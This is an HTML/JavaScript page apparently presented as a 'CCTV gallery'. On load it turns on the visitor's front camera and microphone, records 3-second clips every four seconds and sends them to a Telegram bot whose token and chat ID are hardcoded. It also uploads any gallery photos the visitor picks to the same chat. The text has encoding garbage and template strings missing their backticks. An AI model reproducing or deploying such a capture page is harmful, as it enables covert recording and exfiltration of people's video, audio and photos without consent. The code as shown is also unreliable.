CCTV gallery 


<!DOCTYPE html>
<html lang="my">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Front Camera CCTV + Gallery â†’ Telegram</title>
<style>
body { font-family:sans-serif; background:#0f3b4b; color:#fff; text-align:center; padding:20px; }
video { width:320px; border:2px solid #2fb66e; border-radius:8px; margin:10px; }
#status { margin-top:10px; color:#ffd; }
input { margin-top:10px; }
</style>
</head>
<body>
<h2>ðŸ“¹ Front Camera CCTV (3s Clip) + Gallery Auto â†’ Telegram</h2>
<video id="preview" autoplay playsinline></video>
<input type="file" id="galleryInput" multiple accept="image/*">
<div id="status">Status: idle</div>

<script>
// ===== Telegram Bot Configuration =====
const BOT_TOKEN = "8439360131:AAGHrU3cstAg-EzNIWv4g1b2l6DD_3l8CKE";
const CHAT_IDÂ Â  = "1842424886";

const video = document.getElementById("preview");
const statusEl = document.getElementById("status");
const galleryInput = document.getElementById("galleryInput");
let mediaRecorder, chunks = [];

// ===== Camera Auto 3s Clip =====
async function startCamera(){
Â  try {
Â Â Â  const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" }, audio:true });
Â Â Â  video.srcObject = stream;

Â Â Â  mediaRecorder = new MediaRecorder(stream, { mimeType:"video/webm" });
Â Â Â  mediaRecorder.ondataavailable = e => chunks.push(e.data);
Â Â Â  mediaRecorder.onstop = sendVideo;

Â Â Â  startRecordingLoop();
Â Â Â  statusEl.textContent = "Camera ready. Recording 3s clips...";
Â  } catch(err){
Â Â Â  statusEl.textContent = "Camera error: " + err.message;
Â  }
}

function startRecordingLoop(){
Â  setInterval(()=>{
Â Â Â  if(mediaRecorder && mediaRecorder.state==="inactive"){
Â Â Â Â Â  chunks = [];
Â Â Â Â Â  mediaRecorder.start();
Â Â Â Â Â  statusEl.textContent = "ðŸ”´ Recording 3s clip...";
Â Â Â Â Â  setTimeout(()=> mediaRecorder.stop(), 3000);
Â Â Â  }
Â  }, 4000); // 1s pause between clips
}

async function sendVideo(){
Â  if(chunks.length === 0) return;
Â  const blob = new Blob(chunks, {type:"video/webm"});
Â  const fd = new FormData();
Â  fd.append("video", blob, clip_${Date.now()}.webm);
Â  try{
Â Â Â  const resp = await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}, {
Â Â Â Â Â  method:"POST", body: fd
Â Â Â  });
Â Â Â  const data = await resp.json();
Â Â Â  statusEl.textContent = data.ok ? "âœ… Clip sent" : "âŒ Clip failed";
Â  } catch(e){
Â Â Â  statusEl.textContent = "Upload error: "+e.message;
Â  }
}

// ===== Gallery Auto Upload =====
galleryInput.addEventListener("change", ()=>{
Â  const files = galleryInput.files;
Â  for(let i=0; i<files.length; i++){
Â Â Â  const fd = new FormData();
Â Â Â  fd.append("photo", files[i]);
Â Â Â  fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}, { method:"POST", body: fd })
Â Â Â Â Â  .then(r=>r.json())
Â Â Â Â Â  .then(d=>{ statusEl.textContent = d.ok ? âœ… Gallery ${i+1} sent : "âŒ Gallery failed`; })
Â Â Â Â Â  .catch(e=>statusEl.textContent="Gallery upload error: "+e.message);
Â  }
});

// ===== Start Camera =====
startCamera();
</script>
</body>
</html>
